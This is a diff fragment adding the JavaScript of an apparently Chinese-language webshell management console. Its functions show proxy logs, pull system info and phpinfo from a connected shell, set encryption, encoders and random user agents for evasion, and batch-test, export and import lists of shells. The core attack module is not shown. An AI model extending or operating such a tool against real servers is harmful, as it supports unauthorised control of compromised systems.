+        function addProxyLog(message, type = 'info') {
+            const logsEl = document.getElementById('proxyLogs');
+            const colors = {
+                'info': 'text-cyan-400',
+                'success': 'text-green-400',
+                'error': 'text-red-400',
+                'warning': 'text-yellow-400'
+            };
+
+            const entry = document.createElement('div');
+            entry.className = `${colors[type] || 'text-slate-400'}`;
+            entry.innerHTML = `<span class="text-slate-600">[${new Date().toLocaleTimeString()}]</span> ${message}`;
+
+            if (logsEl.querySelector('.text-center')) {
+                logsEl.innerHTML = '';
+            }
+            logsEl.insertBefore(entry, logsEl.firstChild);
+        }
+
+        function clearProxyLogs() {
+            document.getElementById('proxyLogs').innerHTML = '<div class="text-slate-600 text-center py-2">暂无日志</div>';
+            WebshellProxy.clearLogs();
+        }
+
+        function updateProxyStatus() {
+            const status = WebshellProxy.getStatus();
+            document.getElementById('proxyConnections').textContent = status.connections;
+
+            const formatBytes = (bytes) => {
+                if (bytes === 0) return '0 B';
+                const k = 1024;
+                const sizes = ['B', 'KB', 'MB', 'GB'];
+                const i = Math.floor(Math.log(bytes) / Math.log(k));
+                return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
+            };
+
+            document.getElementById('proxyBytesIn').textContent = formatBytes(status.bytesIn);
+            document.getElementById('proxyBytesOut').textContent = formatBytes(status.bytesOut);
+        }
+
+        // 系统信息
+        async function refreshSystemInfo() {
+            const shell = WebshellCore.getActiveShell();
+            if (!shell) {
+                document.getElementById('systemInfo').innerHTML = '<div class="text-slate-600 text-xs text-center py-4">请先连接 Shell</div>';
+                return;
+            }
+
+            const info = await WebshellCore.getShellInfo(shell);
+            if (info) {
+                const infoHtml = Object.entries(info).map(([key, value]) => `
+                    <div class="flex justify-between p-2 bg-slate-800 rounded">
+                        <span class="text-slate-400 text-xs">${key}</span>
+                        <span class="text-slate-200 text-xs font-mono">${value}</span>
+                    </div>
+                `).join('');
+                document.getElementById('systemInfo').innerHTML = infoHtml;
+            }
+        }
+
+        async function downloadPhpInfo() {
+            const shell = WebshellCore.getActiveShell();
+            if (!shell) {
+                alert('请先连接 Shell');
+                return;
+            }
+            appendTerminalOutput('[*] 正在获取 phpinfo...', 'info');
+            const result = await WebshellCore.getPhpInfo(shell);
+            if (result.success) {
+                // 在终端显示phpinfo链接或直接显示
+                const htmlContent = result.data;
+                // 创建新窗口显示
+                const newWindow = window.open('', '_blank');
+                if (newWindow) {
+                    newWindow.document.write(htmlContent);
+                    newWindow.document.close();
+                } else {
+                    // 如果弹窗被阻止，下载文件
+                    const blob = new Blob([htmlContent], { type: 'text/html' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = 'phpinfo.html';
+                    a.click();
+                    URL.revokeObjectURL(url);
+                }
+                appendTerminalOutput('[+] phpinfo 已获取', 'success');
+            } else {
+                appendTerminalOutput('[-] 获取 phpinfo 失败: ' + result.error, 'error');
+            }
+        }
+
+        // 配置
+        function saveConfig() {
+            const shell = WebshellCore.getActiveShell();
+            if (shell) {
+                shell.enableEncryption = document.getElementById('configEncryption').checked;
+                shell.enableSign = document.getElementById('configSign').checked;
+                shell.enablePadding = document.getElementById('configPadding').checked;
+                shell.encoding = document.getElementById('configEncoding').value;
+                shell.encoder = document.getElementById('configEncoder').value;
+                shell.decoder = document.getElementById('configDecoder').value;
+                shell.timeout = parseInt(document.getElementById('configTimeout').value);
+                shell.userAgent = document.getElementById('configRandomUA').checked ? 'random' : 'default';
+                WebshellCore.saveShells();
+                updateCryptoStatus(shell.enableEncryption, shell);
+                alert('配置已保存');
+            }
+        }
+
+        // 批量测试
+        async function batchTestAll() {
+            const shells = WebshellCore.getShells();
+            if (shells.length === 0) {
+                alert('没有 Shell 可测试');
+                return;
+            }
+            appendTerminalOutput(`[*] 开始批量测试 ${shells.length} 个 Shell...`, 'info');
+            const results = await WebshellCore.batchTest(shells);
+            const success = results.filter(r => r.success).length;
+            appendTerminalOutput(`[*] 测试完成: ${success}/${shells.length} 成功`, success === shells.length ? 'success' : 'warning');
+            refreshShellList();
+        }
+
+        // 导出
+        function exportShells() {
+            const shells = WebshellCore.getShells();
+            if (shells.length === 0) {
+                alert('没有 Shell 可导出');
+                return;
+            }
+            const data = WebshellCore.exportShells('json');
+            const blob = new Blob([data], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'webshells.json';
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        // 导入
+        async function importShellsData() {
+            const format = document.getElementById('importFormat').value;
+            const data = document.getElementById('importData').value;
+            if (!data) {
+                alert('请输入数据');
+                return;
+            }
+            const result = WebshellCore.importShells(data, format);
+            if (result.success) {
+                alert(`成功导入 ${result.count} 个 Shell`);
+                hideImportModal();
+                refreshShellList();
+            } else {
+                alert(`导入失败: ${result.error}`);
+            }
+        }
+    </script>
+</body>
+</html>
